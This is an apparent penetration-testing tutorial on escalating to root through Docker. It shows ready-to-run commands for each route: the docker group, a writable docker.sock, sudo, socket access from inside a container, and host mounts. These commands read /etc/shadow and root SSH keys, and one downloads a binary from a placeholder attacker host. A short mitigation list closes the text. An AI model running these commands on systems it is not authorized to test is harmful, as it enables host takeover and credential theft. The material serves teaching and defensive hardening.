## Overview

Docker is a widely used **containerization platform** that allows applications to run inside lightweight, isolated environments called **containers**.

Unlike virtual machines, Docker containers:

- share the host kernel
- use fewer system resources
- start quickly
- are portable across environments
- package code, libraries, dependencies, and configuration together

This makes Docker extremely useful in:

- development
- CI/CD pipelines
- testing
- microservices
- cloud deployments

From a privilege escalation perspective, Docker is important because **access to Docker often equals root-level access on the host**.

# Docker Architecture

Docker uses a **client-server model** built around two main components:

- **Docker client**
- **Docker daemon**

## Docker Client

The Docker client is what we interact with using commands such as:

```bash
docker ps
docker run
docker exec
docker images
```

It sends requests to the Docker daemon.

---

## Docker Daemon

The Docker daemon is the service that actually performs Docker operations, including:

- creating containers
- starting/stopping containers
- pulling images
- managing networks
- managing volumes
- handling logs
- controlling container lifecycle

This is the real trust boundary.  
If we can control the daemon, we can usually control the host.

---

# Docker Images vs Containers

## Image

A Docker image is a **read-only blueprint** for a container.

It includes:

- application code
- runtime
- libraries
- dependencies
- configuration

---

## Container

A container is a **running instance** of an image.

Containers are:

- isolated
- executable
- mutable at runtime
- separate in terms of filesystem, processes, and networking

---

# Why Docker Access Is Dangerous

If a user can interact with Docker, they can often:

- start privileged containers
- mount host directories into containers
- access host root filesystem
- read host SSH keys
- modify sensitive files
- create persistence
- effectively become root on the host

In practice, the following are usually enough for privilege escalation:

- membership in the **docker** group
- **sudo** rights for docker
- a writable **Docker socket**
- access to Docker from inside another container

# 1. Docker Group Membership

If our user belongs to the `docker` group, we can control the Docker daemon.

Check membership:

```bash
id
```

Example:

```bash
uid=1000(docker-user) gid=1000(docker-user) groups=1000(docker-user),116(docker)
```

This is usually enough to escalate.

---

## Why This Works

Docker can start containers that mount the host root filesystem:

```bash
docker run -v /:/mnt --rm -it ubuntu chroot /mnt bash
```

This gives us a shell inside the host filesystem as root.

---

## Basic Host Escape via Docker Group

```bash
docker run -v /:/mnt --rm -it ubuntu chroot /mnt bash
```

Inside the container:

```bash
id
ls -la /root
cat /root/.ssh/id_rsa
```

From there we can:

- read `/etc/shadow`
- steal root SSH keys
- add authorized_keys
- modify `/etc/sudoers`
- create backdoor users

---

# 2. Writable Docker Socket

The Docker daemon commonly listens on:

```bash
/var/run/docker.sock
```

If this socket is writable, that is usually enough to fully compromise the host.

Check permissions:

```bash
ls -l /var/run/docker.sock
```

Or search for alternate sockets:

```bash
find / -name docker.sock 2>/dev/null
```

If accessible:

```bash
docker -H unix:///var/run/docker.sock ps
```

Then spawn a container that mounts host root:

```bash
docker -H unix:///var/run/docker.sock run -v /:/mnt --rm -it ubuntu chroot /mnt bash
```

This is effectively direct root-level host access.

---

# 3. Sudo Rights Over Docker

If we can run Docker via sudo, it is usually game over.

Check:

```bash
sudo -l
```

Examples of dangerous entries:

```text
(root) NOPASSWD: /usr/bin/docker
(root) /usr/bin/docker
```

Exploit:

```bash
sudo docker run -v /:/mnt --rm -it ubuntu chroot /mnt bash
```

Or with a mounted shell drop:

```bash
sudo docker run --rm -it -v /:/host ubuntu bash
```

Then:

```bash
chroot /host bash
```

---

# 4. Docker Access From Inside a Container

Sometimes we land **inside a Docker container**, but that container exposes the Docker socket.

Example:

```bash
ls -al
```

Output:

```text
srw-rw---- 1 root root 0 Jun 30 15:27 docker.sock
```

This means the container can talk to the host Docker daemon.

If Docker binary is missing, upload a static one or download it.

Example:

```bash
wget https://<attacker-host>:443/docker -O docker
chmod +x docker
```

List running containers:

```bash
./docker -H unix:///app/docker.sock ps
```

Create a privileged container with host root mounted:

```bash
./docker -H unix:///app/docker.sock run --rm -d --privileged -v /:/hostsystem main_app
```

List containers again:

```bash
./docker -H unix:///app/docker.sock ps
```

Enter the new container:

```bash
./docker -H unix:///app/docker.sock exec -it <container_id> /bin/bash
```

Then read host files:

```bash
cat /hostsystem/root/.ssh/id_rsa
cat /hostsystem/etc/shadow
```

This is one of the most common container breakout misconfigurations.

---

# 5. Shared Directories / Volume Mounts

A container may already have host directories mounted inside it.

This is a lower-noise path because no new container needs to be created.

Example:

```bash
cd /hostsystem/home/cry0l1t3
ls -l
```

Potential findings:

- `.bash_history`
- `.ssh/id_rsa`
- configuration files
- application secrets
- database credentials

Example:

```bash
cat /hostsystem/home/cry0l1t3/.ssh/id_rsa
```

If readable, copy the private key and use it to SSH into the host.

Example:

```bash
ssh cry0l1t3@<host-ip> -i cry0l1t3.priv
```

Shared mounts can expose:

- `/root`
- `/home`
- `/etc`
- `/opt`
- source code repos
- deployment configs
- backup folders

# Indicators That Docker Is a Viable PrivEsc Path

- user is in `docker` group
- `docker.sock` is writable
- docker command available
- docker allowed via sudo
- container has host bind mounts
- privileged containers already running
- compose files expose socket
- Docker binary can be uploaded and used against accessible socket

---

# Defensive Mitigation

To reduce Docker-based privilege escalation risk:

- do **not** add untrusted users to the `docker` group
- restrict Docker socket access
- avoid exposing `docker.sock` into containers
- avoid running privileged containers
- avoid bind-mounting host root into containers
- use least privilege on container users
- audit `docker-compose.yml` and deployment manifests
- use rootless Docker where appropriate
- monitor Docker daemon activity
- limit sudo access to Docker

---

# Key Takeaways

- Docker access often equals **root-equivalent access**
- `docker` group membership is highly privileged
- writable Docker socket is usually a direct host compromise
- host bind mounts can leak SSH keys and credentials
- a container with Docker socket access can often escape to host
- Docker misconfigurations are common in dev and CI/CD environments
- always enumerate Docker early during Linux privilege escalation
